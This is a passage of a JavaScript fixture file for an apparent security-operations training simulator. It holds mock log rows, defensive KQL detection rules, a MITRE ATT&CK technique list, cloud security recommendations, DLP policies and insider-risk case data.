  { TimeGenerated:'2026-07-06T08:03:44Z', SrcIp:'10.5.18.23', DstIp:'198.51.100.24', Action:'Allowed', BytesOut:1833 },
  { TimeGenerated:'2026-07-06T08:04:08Z', SrcIp:'10.5.18.23', DstIp:'198.51.100.24', Action:'Allowed', BytesOut:2104 },
  { TimeGenerated:'2026-07-06T08:05:55Z', SrcIp:'10.5.20.18', DstIp:'192.0.2.44', Action:'Blocked', BytesOut:0 },
];

const SUMMARY_RULE_RESULTS = [
  { TimeGenerated:'2026-07-06T08:00:00Z', SrcIp:'10.5.12.44', DstIp:'203.0.113.10', Events:3, BytesOut:86403, Blocks:1 },
  { TimeGenerated:'2026-07-06T08:00:00Z', SrcIp:'10.5.18.23', DstIp:'198.51.100.24', Events:2, BytesOut:3937, Blocks:0 },
  { TimeGenerated:'2026-07-06T08:00:00Z', SrcIp:'10.5.20.18', DstIp:'192.0.2.44', Events:1, BytesOut:0, Blocks:1 },
];

const SUMMARY_RULE_QUERY = `NetworkLogs_CL
| summarize Events=count(), BytesOut=sum(BytesOut), Blocks=countif(Action == "Blocked")
    by SrcIp, DstIp, bin(TimeGenerated, 1h)
| order by Events desc`;

const SUMMARY_TABLE_QUERY = `NetworkSummary_CL
| where TimeGenerated > ago(24h)
| where Blocks > 0 or BytesOut > 50000
| project TimeGenerated, SrcIp, DstIp, Events, BytesOut, Blocks`;

const DATA_LAKE_KQL_JOB = {
  name:'180-day DNS beaconing review',
  source:'SentinelDataLake.ArchiveDns_CL',
  resultTable:'DnsBeaconingResults_CL',
  runtime:'18 min estimated',
  query:`SentinelDataLake.ArchiveDns_CL
| where TimeGenerated between (datetime(2026-01-01) .. datetime(2026-06-30))
| summarize QueryCount=count(), UniqueHosts=dcount(SrcHostname) by DnsQuery, bin(TimeGenerated, 1d)
| where QueryCount > 250 and UniqueHosts < 4
| project TimeGenerated, DnsQuery, QueryCount, UniqueHosts`,
  results:[
    { TimeGenerated:'2026-06-12T00:00:00Z', DnsQuery:'sync-a.bad-demo.example', QueryCount:341, UniqueHosts:2, Verdict:'Beaconing candidate' },
    { TimeGenerated:'2026-06-13T00:00:00Z', DnsQuery:'sync-a.bad-demo.example', QueryCount:328, UniqueHosts:2, Verdict:'Beaconing candidate' },
    { TimeGenerated:'2026-06-21T00:00:00Z', DnsQuery:'cdn-metrics.hacksmarterlabs.example', QueryCount:411, UniqueHosts:1, Verdict:'Benign updater allowlist review' },
  ],
};

const SENTINEL_NOTEBOOKS = [
  { name:'Incident entity expansion', language:'Python', status:'Ready',
    inputs:'Incident ID, account, host, IP', output:'Entity timeline plus related incidents',
    detail:'Uses local mock graph fixtures to show how a notebook can pivot from incident entities into related alerts.' },
  { name:'Threat intel enrichment', language:'Python', status:'Template',
    inputs:'IP/domain indicator list', output:'Confidence scoring worksheet',
    detail:'Demonstrates offline enrichment logic against bundled ThreatIntelIndicators rows.' },
  { name:'Data lake hunting job review', language:'KQL + Python', status:'Ready',
    inputs:'DnsBeaconingResults_CL', output:'Ranked beaconing candidates',
    detail:'Consumes the Data lake KQL job result table instead of querying raw long-range telemetry interactively.' },
];

const SENTINEL_MCP_NOTES = [
  { title:'Connection purpose', detail:'Sentinel MCP Server can expose workspace context, incidents, rules, and hunting actions to an AI-assisted client.' },
  { title:'Lab boundary', detail:'This simulator does not make MCP, Azure, Graph, or Log Analytics calls; the notebook view shows where that connection fits conceptually.' },
  { title:'Operational caution', detail:'Use least-privilege identities, scoped workspaces, and reviewed tool actions before allowing any assistant to run investigation commands.' },
];

const SENTINEL_RULES = [
  { name:'Successful sign-in from blocked country',
    type:'Scheduled', severity:'medium', enabled:true, frequency:'Every 5 minutes', tactics:['Initial Access'],
    query:`SigninLogs\n| where ResultType == 0\n| where LocationDetails.countryOrRegion in ("KP","IR")\n| project TimeGenerated, UserPrincipalName, IPAddress, LocationDetails` },
  { name:'Mass file deletion in OneDrive',
    type:'Scheduled', severity:'high', enabled:true, frequency:'Every 5 minutes', tactics:['Impact'],
    query:`OfficeActivity\n| where Operation == "FileDeleted"\n| summarize Deletions=count() by UserId, bin(TimeGenerated,5m)\n| where Deletions > 100` },
  { name:'Suspicious resource deployment from new IP',
    type:'Scheduled', severity:'medium', enabled:true, frequency:'Every 15 minutes', tactics:['Defense Evasion','Persistence'],
    query:`AzureActivity\n| where OperationNameValue endswith "/write"\n| where CallerIpAddress !in (cached_ips)\n| project TimeGenerated, Caller, OperationNameValue, CallerIpAddress` },
  { name:'Brute force against Azure VM (RDP/SSH)',
    type:'Scheduled', severity:'high', enabled:true, frequency:'Every 5 minutes', tactics:['Credential Access'],
    query:`SecurityEvent\n| where EventID == 4625\n| summarize Failures=count() by IpAddress, Computer, bin(TimeGenerated,5m)\n| where Failures > 50` },
  { name:'New Global Administrator role assignment',
    type:'Scheduled', severity:'high', enabled:true, frequency:'Every 5 minutes', tactics:['Privilege Escalation'],
    query:`AuditLogs\n| where OperationName == "Add member to role"\n| where TargetResources has "Global Administrator"` },
  { name:'TI map synthetic IOC to custom transaction events',
    type:'Threat intelligence', severity:'high', enabled:true, frequency:'Every 5 minutes',
    tactics:['Command and Control','Initial Access'],
    techniques:['T1071','T1566'],
    entities:['IP: DstIp','Account: AccountName','URL: Url','DNS: Domain'],
    query:TI_IP_MATCH_QUERY },
  { name:'NRT high-risk sign-in from unfamiliar location',
    type:'NRT', severity:'high', enabled:true, frequency:'Every 1 minute',
    tactics:['Initial Access','Credential Access'],
    techniques:['T1078'],
    entities:['Account: UserPrincipalName','IP: IPAddress'],
    query:`SigninLogs\n| where RiskLevel == "High"\n| where ResultType == 0\n| project TimeGenerated, UserPrincipalName, IPAddress, RiskLevel` },
  { name:'Fusion multi-stage identity and OAuth attack',
    type:'ML behavior analytics', severity:'high', enabled:true, frequency:'Built-in ML correlation',
    tactics:['Initial Access','Persistence','Credential Access'],
    techniques:['T1566','T1098','T1078'],
    entities:['Account','Cloud application','IP'],
    query:`// Built-in Fusion behavior analytics rule.\n// Correlates risky sign-in, phishing click, OAuth consent, and impossible travel signals.` },
];

const SENTINEL_ANALYTICS_RULE_TYPES = [
  { id:'scheduled', name:'Scheduled query rule', badge:'Scheduled',
    summary:'Runs a KQL query on a schedule and creates alerts when the result threshold is met.',
    bestFor:'Repeatable hunts, entity mapping, custom alert details, and automation rules.',
    limits:['Frequency and lookback are configurable.', 'Supports full rule wizard controls in this lab.', 'Use the query preview to validate fixture rows.'],
    defaults:{
      name:'High-risk sign-in from unfamiliar location',
      severity:'Medium',
      tactics:'Initial Access, Credential Access',
      query:`SigninLogs
| where RiskLevel == "High"
| project TimeGenerated, UserPrincipalName, IPAddress, RiskLevel, ResultType`,
      runEvery:'5 minutes',
      lookback:'5 minutes',
      start:'Automatically',
    } },
  { id:'nrt', name:'Near-real-time query rule', badge:'NRT',
    summary:'Runs close to ingestion time for fast alerting when latency matters.',
    bestFor:'High-confidence detections that need quick triage, such as risky sign-ins or active command execution.',
    limits:['Runs on a one-minute cadence in the lab model.', 'Keep query logic narrow and efficient.', 'Use short lookback windows and avoid heavy joins.'],
    defaults:{
      name:'NRT high-risk sign-in from unfamiliar location',
      severity:'High',
      tactics:'Initial Access, Credential Access',
      query:`SigninLogs
| where RiskLevel == "High"
| where ResultType == 0
| project TimeGenerated, UserPrincipalName, IPAddress, RiskLevel`,
      runEvery:'1 minute',
      lookback:'1 minute',
      start:'Automatically',
    } },
  { id:'ti', name:'Threat intelligence rule', badge:'TI',
    summary:'Matches indicators from ThreatIntelIndicators against event tables to create alerts.',
    bestFor:'IOC matching, threat intel operationalization, and watchlisted IP/domain investigation.',
    limits:['Requires active indicators and matching telemetry.', 'Map matched IP, URL, DNS, or account entities.', 'Tune expiration and confidence before enabling broadly.'],
    defaults:{
      name:'TI map synthetic IOC to custom transaction events',
      severity:'High',
      tactics:'Command and Control, Initial Access',
      query:TI_IP_MATCH_QUERY,
      runEvery:'5 minutes',
      lookback:'1 hour',
      start:'Automatically',
    } },
  { id:'fusion', name:'ML behavior analytics (Fusion)', badge:'ML',
    summary:'Uses built-in machine-learning correlation to combine suspicious behaviors into high-fidelity incidents.',
    bestFor:'Multi-stage attacks where several low-volume signals become meaningful together.',
    limits:['No custom KQL authoring in this lab model.', 'Requires supported data connectors and active behavior analytics.', 'Review generated incidents and entity graph pivots before closing.'],
    defaults:{
      name:'Fusion multi-stage identity and OAuth attack',
      severity:'High',
      tactics:'Initial Access, Persistence, Credential Access',
      query:`// Fusion rules use built-in ML correlation rather than custom KQL in this lab.
// Enable the rule, verify required data connectors, then review generated incidents.`,
      runEvery:'Built-in',
      lookback:'Built-in',
      start:'When enabled',
    } },
];

// Anomaly rules carry a Status (Enabled/Disabled) AND a Mode (Production/Flighting).
// Production = results land in the Anomalies table and can drive incidents/enrichment.
// Flighting  = a tuned copy runs side-by-side with Production for A/B comparison,
//              WITHOUT affecting production results/incidents. Tune in Flighting,
//              compare, then promote the tuned version to Production.
const SENTINEL_ANOMALY_RULES = [
  { name:'Anomalous sign-in location by user', status:'Enabled', mode:'Production', source:'UEBA',
    severity:'medium', threshold:'Medium and High anomalies', tactics:['Initial Access'],
    customization:'Exclude known travel IP ranges and service accounts.',
    modeNote:'Baseline validated in Flighting last sprint; tuned copy promoted to Production.',
    feeds:'Hunting bookmarks, incident enrichment, and scheduled rules that join anomalies to SigninLogs.' },
  { name:'Rare process on endpoint peer group', status:'Enabled', mode:'Flighting', source:'Entity behavior',
    severity:'medium', threshold:'Score >= 0.78 (Flighting) vs 0.85 (Production)', tactics:['Execution','Defense Evasion'],
    customization:'Pilot on finance and Tier 0 device groups before broad incident creation.',
    modeNote:'Testing a lower score threshold against the live Production copy — no incidents from this version yet.',
    feeds:'Hunting graph pivots and custom analytics rules that correlate rare process with risky sign-in.' },
  { name:'Unusual data access volume', status:'Disabled', mode:'Flighting', source:'Data lake baseline',
    severity:'low', threshold:'Score >= 0.65', tactics:['Collection','Exfiltration'],
    customization:'Disabled until summary-rule baselines have seven clean business days.',
    modeNote:'Held in Flighting while the baseline stabilizes; will not reach Production until row quality is stable.',
    feeds:'Hunting queue only; do not create incidents until the baseline is stable.' },
  { name:'Impossible travel with OAuth grant', status:'Enabled', mode:'Production', source:'Fusion signal',
    severity:'high', threshold:'High anomalies only', tactics:['Initial Access','Persistence'],
    customization:'Create incidents only when an OAuth consent or risky app event occurs within 30 minutes.',
    modeNote:'High-confidence path — running in Production and feeding Fusion incidents.',
    feeds:'Fusion incidents and the phishing-to-OAuth investigation path.' },
];

const SENTINEL_ANOMALY_HUNTING_ROWS = [
  { TimeGenerated:'2026-07-06T07:42:00Z', AnomalyRule:'Anomalous sign-in location by user', Entity:'sam.lee@hacksmarterlabs.example', Score:'0.91', RelatedTable:'SigninLogs', Action:'Open identity investigation' },
  { TimeGenerated:'2026-07-06T08:05:00Z', AnomalyRule:'Rare process on endpoint peer group', Entity:'FIN-FS-02', Score:'0.84', RelatedTable:'DeviceProcessEvents', Action:'Correlate with ransomware incident' },
  { TimeGenerated:'2026-07-06T08:23:00Z', AnomalyRule:'Impossible travel with OAuth grant', Entity:'jane.doe@hacksmarterlabs.example', Score:'0.96', RelatedTable:'CloudAppEvents', Action:'Create high severity incident' },
];

// Curated subset of MITRE ATT&CK Enterprise v15 (tactic order matches attack.mitre.org).
// Not exhaustive — chosen to mirror the cells Sentinel typically shows and to include the
// techniques the lab's analytics rules cover so they light up.
const MITRE_ATTCK = [
  { id:'TA0043', name:'Reconnaissance', techniques:[
    { id:'T1595', name:'Active Scanning' },
    { id:'T1592', name:'Gather Victim Host Information' },
    { id:'T1589', name:'Gather Victim Identity Information' },
    { id:'T1590', name:'Gather Victim Network Information' },
    { id:'T1598', name:'Phishing for Information' },
    { id:'T1597', name:'Search Closed Sources' },
    { id:'T1596', name:'Search Open Technical Databases' },
    { id:'T1593', name:'Search Open Websites/Domains' },
  ]},
  { id:'TA0042', name:'Resource Development', techniques:[
    { id:'T1583', name:'Acquire Infrastructure' },
    { id:'T1586', name:'Compromise Accounts' },
    { id:'T1584', name:'Compromise Infrastructure' },
    { id:'T1587', name:'Develop Capabilities' },
    { id:'T1585', name:'Establish Accounts' },
    { id:'T1588', name:'Obtain Capabilities' },
    { id:'T1608', name:'Stage Capabilities' },
  ]},
  { id:'TA0001', name:'Initial Access', techniques:[
    { id:'T1189', name:'Drive-by Compromise' },
    { id:'T1190', name:'Exploit Public-Facing Application' },
    { id:'T1133', name:'External Remote Services' },
    { id:'T1200', name:'Hardware Additions' },
    { id:'T1566', name:'Phishing' },
    { id:'T1091', name:'Replication Through Removable Media' },
    { id:'T1195', name:'Supply Chain Compromise' },
    { id:'T1199', name:'Trusted Relationship' },
    { id:'T1078', name:'Valid Accounts' },
  ]},
  { id:'TA0002', name:'Execution', techniques:[
    { id:'T1059', name:'Command and Scripting Interpreter' },
    { id:'T1609', name:'Container Administration Command' },
    { id:'T1610', name:'Deploy Container' },
    { id:'T1203', name:'Exploitation for Client Execution' },
    { id:'T1559', name:'Inter-Process Communication' },
    { id:'T1106', name:'Native API' },
    { id:'T1053', name:'Scheduled Task/Job' },
    { id:'T1129', name:'Shared Modules' },
    { id:'T1072', name:'Software Deployment Tools' },
    { id:'T1569', name:'System Services' },
    { id:'T1204', name:'User Execution' },
    { id:'T1047', name:'Windows Management Instrumentation' },
  ]},
  { id:'TA0003', name:'Persistence', techniques:[
    { id:'T1098', name:'Account Manipulation' },
    { id:'T1197', name:'BITS Jobs' },
    { id:'T1547', name:'Boot or Logon Autostart Execution' },
    { id:'T1037', name:'Boot or Logon Initialization Scripts' },
    { id:'T1136', name:'Create Account' },
    { id:'T1543', name:'Create or Modify System Process' },
    { id:'T1546', name:'Event Triggered Execution' },
    { id:'T1133', name:'External Remote Services' },
    { id:'T1574', name:'Hijack Execution Flow' },
    { id:'T1556', name:'Modify Authentication Process' },
    { id:'T1053', name:'Scheduled Task/Job' },
    { id:'T1078', name:'Valid Accounts' },
  ]},
  { id:'TA0004', name:'Privilege Escalation', techniques:[
    { id:'T1548', name:'Abuse Elevation Control Mechanism' },
    { id:'T1134', name:'Access Token Manipulation' },
    { id:'T1547', name:'Boot or Logon Autostart Execution' },
    { id:'T1543', name:'Create or Modify System Process' },
    { id:'T1484', name:'Domain or Tenant Policy Modification' },
    { id:'T1611', name:'Escape to Host' },
    { id:'T1068', name:'Exploitation for Privilege Escalation' },
    { id:'T1574', name:'Hijack Execution Flow' },
    { id:'T1055', name:'Process Injection' },
    { id:'T1078', name:'Valid Accounts' },
  ]},
  { id:'TA0005', name:'Defense Evasion', techniques:[
    { id:'T1548', name:'Abuse Elevation Control Mechanism' },
    { id:'T1134', name:'Access Token Manipulation' },
    { id:'T1140', name:'Deobfuscate/Decode Files or Information' },
    { id:'T1480', name:'Execution Guardrails' },
    { id:'T1564', name:'Hide Artifacts' },
    { id:'T1562', name:'Impair Defenses' },
    { id:'T1070', name:'Indicator Removal' },
    { id:'T1036', name:'Masquerading' },
    { id:'T1556', name:'Modify Authentication Process' },
    { id:'T1112', name:'Modify Registry' },
    { id:'T1027', name:'Obfuscated Files or Information' },
    { id:'T1218', name:'System Binary Proxy Execution' },
    { id:'T1078', name:'Valid Accounts' },
  ]},
  { id:'TA0006', name:'Credential Access', techniques:[
    { id:'T1110', name:'Brute Force' },
    { id:'T1555', name:'Credentials from Password Stores' },
    { id:'T1212', name:'Exploitation for Credential Access' },
    { id:'T1187', name:'Forced Authentication' },
    { id:'T1606', name:'Forge Web Credentials' },
    { id:'T1056', name:'Input Capture' },
    { id:'T1556', name:'Modify Authentication Process' },
    { id:'T1111', name:'Multi-Factor Authentication Interception' },
    { id:'T1621', name:'Multi-Factor Authentication Request Generation' },
    { id:'T1040', name:'Network Sniffing' },
    { id:'T1003', name:'OS Credential Dumping' },
    { id:'T1558', name:'Steal or Forge Kerberos Tickets' },
    { id:'T1539', name:'Steal Web Session Cookie' },
  ]},
  { id:'TA0007', name:'Discovery', techniques:[
    { id:'T1087', name:'Account Discovery' },
    { id:'T1010', name:'Application Window Discovery' },
    { id:'T1217', name:'Browser Information Discovery' },
    { id:'T1083', name:'File and Directory Discovery' },
    { id:'T1046', name:'Network Service Discovery' },
    { id:'T1135', name:'Network Share Discovery' },
    { id:'T1057', name:'Process Discovery' },
    { id:'T1018', name:'Remote System Discovery' },
    { id:'T1518', name:'Software Discovery' },
    { id:'T1082', name:'System Information Discovery' },
    { id:'T1614', name:'System Location Discovery' },
  ]},
  { id:'TA0008', name:'Lateral Movement', techniques:[
    { id:'T1210', name:'Exploitation of Remote Services' },
    { id:'T1534', name:'Internal Spearphishing' },
    { id:'T1570', name:'Lateral Tool Transfer' },
    { id:'T1563', name:'Remote Service Session Hijacking' },
    { id:'T1021', name:'Remote Services' },
    { id:'T1091', name:'Replication Through Removable Media' },
    { id:'T1072', name:'Software Deployment Tools' },
    { id:'T1080', name:'Taint Shared Content' },
    { id:'T1550', name:'Use Alternate Authentication Material' },
  ]},
  { id:'TA0009', name:'Collection', techniques:[
    { id:'T1560', name:'Archive Collected Data' },
    { id:'T1123', name:'Audio Capture' },
    { id:'T1119', name:'Automated Collection' },
    { id:'T1115', name:'Clipboard Data' },
    { id:'T1530', name:'Data from Cloud Storage' },
    { id:'T1213', name:'Data from Information Repositories' },
    { id:'T1005', name:'Data from Local System' },
    { id:'T1039', name:'Data from Network Shared Drive' },
    { id:'T1114', name:'Email Collection' },
    { id:'T1056', name:'Input Capture' },
    { id:'T1113', name:'Screen Capture' },
  ]},
  { id:'TA0011', name:'Command and Control', techniques:[
    { id:'T1071', name:'Application Layer Protocol' },
    { id:'T1092', name:'Communication Through Removable Media' },
    { id:'T1132', name:'Data Encoding' },
    { id:'T1001', name:'Data Obfuscation' },
    { id:'T1568', name:'Dynamic Resolution' },
    { id:'T1573', name:'Encrypted Channel' },
    { id:'T1008', name:'Fallback Channels' },
    { id:'T1105', name:'Ingress Tool Transfer' },
    { id:'T1104', name:'Multi-Stage Channels' },
    { id:'T1095', name:'Non-Application Layer Protocol' },
    { id:'T1572', name:'Protocol Tunneling' },
    { id:'T1090', name:'Proxy' },
    { id:'T1102', name:'Web Service' },
  ]},
  { id:'TA0010', name:'Exfiltration', techniques:[
    { id:'T1020', name:'Automated Exfiltration' },
    { id:'T1030', name:'Data Transfer Size Limits' },
    { id:'T1048', name:'Exfiltration Over Alternative Protocol' },
    { id:'T1041', name:'Exfiltration Over C2 Channel' },
    { id:'T1011', name:'Exfiltration Over Other Network Medium' },
    { id:'T1052', name:'Exfiltration Over Physical Medium' },
    { id:'T1567', name:'Exfiltration Over Web Service' },
    { id:'T1029', name:'Scheduled Transfer' },
    { id:'T1537', name:'Transfer Data to Cloud Account' },
  ]},
  { id:'TA0040', name:'Impact', techniques:[
    { id:'T1531', name:'Account Access Removal' },
    { id:'T1485', name:'Data Destruction' },
    { id:'T1486', name:'Data Encrypted for Impact' },
    { id:'T1565', name:'Data Manipulation' },
    { id:'T1491', name:'Defacement' },
    { id:'T1561', name:'Disk Wipe' },
    { id:'T1499', name:'Endpoint Denial of Service' },
    { id:'T1495', name:'Firmware Corruption' },
    { id:'T1490', name:'Inhibit System Recovery' },
    { id:'T1498', name:'Network Denial of Service' },
    { id:'T1496', name:'Resource Hijacking' },
    { id:'T1489', name:'Service Stop' },
    { id:'T1529', name:'System Shutdown/Reboot' },
  ]},
];

const DEFENDER_CLOUD_RECS = [
  { id:'R-001', severity:'high', title:'Enable MFA for accounts with owner permissions on subscription',
    control:'Enable MFA', resourceType:'Subscription', affected:1,
    description:'A subscription owner can change access and security controls across the environment. Require strong, phishing-resistant authentication before that role can be used.',
    remediation:['Review every principal assigned Owner at subscription scope.','Register an approved strong authentication method for the affected owner.','Require MFA for privileged access and validate the policy with a test sign-in.'],
    assets:['sub-prod-001'], initiatives:['Cloud security benchmark','NIST SP 800-53 Rev. 5'],
    riskFactors:['Privileged role','Broad subscription scope'], attackPath:'Standing Owner access can turn a compromised identity into control of production resources.' },
  { id:'R-002', severity:'high', title:'Storage accounts should disable public network access',
    control:'Restrict unauthorized network access', resourceType:'Storage account', affected:4,
    description:'Public endpoints expand the routes an attacker can use to reach storage. Restrict connectivity to approved private or virtual-network paths.',
    remediation:['Confirm each application has a private or approved network path.','Disable public network access on the affected storage accounts.','Test application access and review storage diagnostic logs after the change.'],
    assets:['sthacksmarterlabslogs','stprodcustomer','stfinancearchive','stbuildartifacts'], initiatives:['Cloud security benchmark','PCI DSS 4.0'],
    riskFactors:['Internet exposure','Sensitive data'], attackPath:'An internet-facing workload can pivot to publicly reachable storage and expose application data.' },
  { id:'R-003', severity:'high', title:'Management ports of virtual machines should be closed',
    control:'Manage access and permissions', resourceType:'Virtual machine', affected:7,
    description:'Direct SSH or RDP exposure increases the chance of password attacks and remote administration abuse. Use a controlled management path instead.',
    remediation:['Inventory public inbound rules for SSH and RDP.','Remove broad management-port rules or replace them with an approved bastion, VPN, or just-in-time rule.','Verify the port is no longer reachable from an untrusted network.'],
    assets:['vm-prod-web-01','vm-finance-02','vm-legacy-api','vm-build-01','vm-jump-east','vm-reporting-02','vm-ops-01'], initiatives:['Cloud security benchmark','CIS Azure Foundations Benchmark 2.0'],
    riskFactors:['Internet exposure','Remote administration'], attackPath:'The active production attack path begins at the exposed SSH service on vm-prod-web-01.' },
  { id:'R-004', severity:'medium', title:'Diagnostic logs in Key Vault should be enabled',
    control:'Enable auditing and logging', resourceType:'Key vault', affected:3,
    description:'Key vault audit events are needed to investigate secret access, configuration changes, and permission use.',
    remediation:['Choose the security workspace or storage destination for each vault.','Enable the audit event category in diagnostic settings.','Run a test secret read and verify that the event arrives at the destination.'],
    assets:['kv-prod-app','kv-finance','kv-build'], initiatives:['Cloud security benchmark','ISO/IEC 27001:2013'],
    riskFactors:['Credential store','Detection gap'], attackPath:'Missing audit events reduce visibility when an identity reads secrets during an attack path.' },
  { id:'R-005', severity:'medium', title:'Just-in-time network access control should be applied on VMs',
    control:'Manage access and permissions', resourceType:'Virtual machine', affected:5,
    description:'Just-in-time access keeps management ports closed until an approved, time-bounded request opens them for a specific source.',
    remediation:['Select the management ports required by administrators.','Configure allowed source ranges and a short maximum access duration.','Request test access, confirm it expires, and review the generated activity record.'],
    assets:['vm-prod-web-01','vm-finance-02','vm-legacy-api','vm-reporting-02','vm-ops-01'], initiatives:['Cloud security benchmark'],
    riskFactors:['Remote administration','Persistent exposure'], attackPath:'Time-bounded access removes the always-open management edge used by the VM attack path.' },
  { id:'R-006', severity:'medium', title:'Web Application Firewall should be enabled on App Gateway',
    control:'Restrict unauthorized network access', resourceType:'App Gateway', affected:2,
    description:'A web application firewall can inspect and block common application-layer attacks before traffic reaches a backend workload.',
    remediation:['Attach an approved WAF policy to each affected gateway.','Start managed rules in detection mode and review false positives.','Move validated rules to prevention mode and monitor blocked requests.'],
    assets:['agw-customer-prod','agw-partner-prod'], initiatives:['Cloud security benchmark','PCI DSS 4.0'],
    riskFactors:['Public web endpoint','Application-layer attacks'], attackPath:'An unfiltered public request can reach application backends that hold customer data.' },
  { id:'R-007', severity:'low', title:'Container images should have vulnerability findings resolved',
    control:'Remediate vulnerabilities', resourceType:'Container image', affected:23,
    description:'Images with known vulnerable packages can carry exploitable code into running clusters. Prioritize findings in deployed images and rebuild from patched bases.',
    remediation:['Identify affected images that are currently running.','Update the base image or vulnerable package and rebuild with a new immutable tag.','Rescan the image, deploy the fixed tag, and prevent reuse of the vulnerable tag.'],
    assets:['acrprod.azurecr.io/api:2026.06','acrprod.azurecr.io/worker:2026.05','21 additional image findings'], initiatives:['Cloud security benchmark','NIST SP 800-53 Rev. 5'],
    riskFactors:['Known exploit','Running workload'], attackPath:'The vulnerable API image is the likely entry point for the active aks-prod container attack path.' },
  { id:'R-008', severity:'low', title:'Defender for Servers Plan 2 should be enabled',
    control:'Enable enhanced security features', resourceType:'Subscription', affected:1,
    description:'The enhanced server protection plan adds workload signals and assessment capabilities needed for deeper prevention and investigation.',
    remediation:['Review cost and coverage requirements for the target subscription.','Enable the server protection plan for sub-dev-001.','Verify provisioning health and confirm protected machines begin reporting.'],
    assets:['sub-dev-001'], initiatives:['Cloud security benchmark'],
    riskFactors:['Coverage gap'], attackPath:'No active attack path is mapped; the finding represents reduced detection and posture coverage.' },
];

// Azure assets for the Defender for Cloud inventory. The Kubernetes row is a
// cluster resource because its ARM ID identifies the managed cluster; the node
// involved in the alert remains secondary investigation context.
const CLOUD_ASSETS = [
  { id:'azure-vm-prod-web-01', name:'vm-prod-web-01', type:'Virtual machine', subscription:'sub-prod-001', region:'westeurope',
    resourceId:'/subscriptions/sub-prod-001/resourceGroups/rg-prod-web/providers/Cloud.Compute/virtualMachines/vm-prod-web-01',
    risk:'High', exposure:'Internet exposed', alerts:2, recs:3,
    alertResources:['vm-prod-web-01'] },
  { id:'azure-aks-prod', name:'aks-prod', subLabel:'Alerted node: node-3', type:'Kubernetes cluster', subscription:'sub-prod-001', region:'westeurope',
    resourceId:'/subscriptions/sub-prod-001/resourceGroups/rg-prod-aks/providers/Cloud.ContainerService/managedClusters/aks-prod',
    risk:'High', exposure:'Privileged container path', alerts:3, recs:4,
    alertResources:['aks-prod / pod-api-77','aks-prod/node-3','acrprod.azurecr.io/api'] },
  { id:'azure-sthacksmarterlabslogs', name:'sthacksmarterlabslogs', type:'Storage account', subscription:'sub-prod-001', region:'westeurope',
    resourceId:'/subscriptions/sub-prod-001/resourceGroups/rg-prod-data/providers/Cloud.Storage/storageAccounts/sthacksmarterlabslogs',
    risk:'Medium', exposure:'Public network access', alerts:1, recs:2,
    alertResources:['sthacksmarterlabslogs'] },
  { id:'azure-sql-prod-reporting', name:'sql-prod-reporting', type:'SQL server', subscription:'sub-prod-001', region:'northeurope',
    resourceId:'/subscriptions/sub-prod-001/resourceGroups/rg-prod-data/providers/Cloud.Sql/servers/sql-prod-reporting',
    risk:'Medium', exposure:'Wide firewall rule', alerts:1, recs:2,
    alertResources:['sql-prod-reporting'] },
  { id:'azure-kv-prod-app', name:'kv-prod-app', type:'Key vault', subscription:'sub-prod-001', region:'westeurope',
    resourceId:'/subscriptions/sub-prod-001/resourceGroups/rg-prod-app/providers/Cloud.KeyVault/vaults/kv-prod-app',
    risk:'Low', exposure:'Unusual access location', alerts:1, recs:1,
    alertResources:['kv-prod-app'] },
];

const COMPLIANCE_FRAMEWORKS = [
  { name:'Cloud security benchmark', percent:72, passing:181, failing:71 },
  { name:'NIST SP 800-53 Rev. 5',              percent:58, passing:412, failing:298 },
  { name:'ISO/IEC 27001:2013',                 percent:64, passing:88,  failing:50 },
  { name:'PCI DSS 4.0',                        percent:51, passing:62,  failing:60 },
  { name:'CIS Azure Foundations Benchmark 2.0',percent:69, passing:118, failing:53 },
];

const DLP_POLICIES = [
  { id:'DLP-001', name:'U.S. Financial Data',
    scope:'Exchange, SharePoint, OneDrive, Teams', enabled:true,
    rules:[
      { name:'Block sharing externally',
        conditions:['Content contains: Credit card number (count ≥ 1, confidence ≥ 85%)','OR Content contains: U.S. bank account number'],
        actions:['Block access for external users','Notify user with policy tip','Generate incident report (high severity)'] },
    ] },
  { id:'DLP-002', name:'PII protection (U.S.)',
    scope:'Exchange, SharePoint, OneDrive, Teams, Endpoint', enabled:true,
    rules:[
      { name:'Warn on egress',
        conditions:['Content contains: U.S. Social Security Number (count ≥ 1, confidence ≥ 85%)'],
        actions:['User override allowed with business justification','Notify compliance officer'] },
    ] },
  { id:'DLP-003', name:'Source code protection',
    scope:'Endpoint DLP', enabled:false,
    rules:[
      { name:'Block upload to non-corporate cloud',
        conditions:['File extension is one of: .cs, .ts, .py, .go','AND Sensitive label = Confidential\\Engineering'],
        actions:['Block upload to non-allowed cloud services','Audit copy to USB'] },
    ] },
];

const DLP_INCIDENTS = [
  { id:'DLP-1007', severity:'high', status:'Needs review', policy:'U.S. Financial Data',
    user:'jdoe@hacksmarterlabs.example', location:'OneDrive', item:'customer-list.xlsx',
    activity:'External share blocked', sensitiveInfo:['Credit card number','U.S. bank account number'],
    time:'2026-06-28T15:00:11Z',
    timeline:['Sensitive info detected in workbook','External sharing attempt blocked','User shown policy tip','Incident report generated'],
    actions:['Keep block','Notify manager','Allow override with business justification','Escalate to eDiscovery'] },
  { id:'DLP-1012', severity:'medium', status:'User override requested', policy:'PII protection (U.S.)',
    user:'maria.ross@hacksmarterlabs.example', location:'SharePoint', item:'employee-roster.csv',
    activity:'Download warning acknowledged', sensitiveInfo:['U.S. Social Security Number'],
    time:'2026-06-28T12:38:00Z',
    timeline:['PII detected','Policy tip displayed','User entered business justification','Reviewer approval pending'],
    actions:['Approve override','Reject override','Request more context'] },
];

const INSIDER_RISK_POLICIES = [
  { name:'Data leaks by departing users', status:'Active', alerts:3,
    triggers:['HR connector: termination date within 30 days','Anomalous download volume from SharePoint'] },
  { name:'General data leaks',           status:'Active', alerts:7,
    triggers:['Downgrade of sensitivity label','Print of labeled documents'] },
  { name:'Risky browser usage',          status:'Test mode', alerts:0,
    triggers:['Egress to consumer file-sharing domains'] },
];

const INSIDER_RISK_CASES = [
  { id:'IR-2044', priority:'High', status:'Active', user:'olivia.martin@hacksmarterlabs.example',
    policy:'Data leaks by departing users', riskScore:86, trigger:'HR termination date within 30 days',
    summary:'Departing user downloaded 1,284 SharePoint files and copied labeled finance data to USB.',
    evidence:['Large SharePoint download volume','USB copy of Confidential\\Engineering file','Sensitivity label downgrade','Upload attempt to personal cloud storage'],
    nextSteps:['Review activity explorer evidence','Interview manager','Create eDiscovery case','Preserve mailbox and OneDrive content'] },
  { id:'IR-2051', priority:'Medium', status:'Needs triage', user:'jdoe@hacksmarterlabs.example',
    policy:'General data leaks', riskScore:61, trigger:'Repeated external sharing attempts',
